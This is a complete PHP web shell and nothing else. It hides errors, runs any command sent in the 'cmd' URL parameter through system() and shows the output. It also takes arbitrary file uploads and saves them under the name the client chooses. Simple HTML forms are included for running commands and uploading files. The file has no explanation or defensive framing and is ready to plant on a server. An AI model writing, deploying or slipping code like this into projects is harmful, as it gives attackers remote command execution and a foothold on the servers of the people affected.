<?php
error_reporting(0);
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
if(isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded: " . $_FILES['file']['name'];
}
?>
<form method="GET">
    <input type="text" name="cmd" placeholder="Command">
    <input type="submit" value="Execute">
</form>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
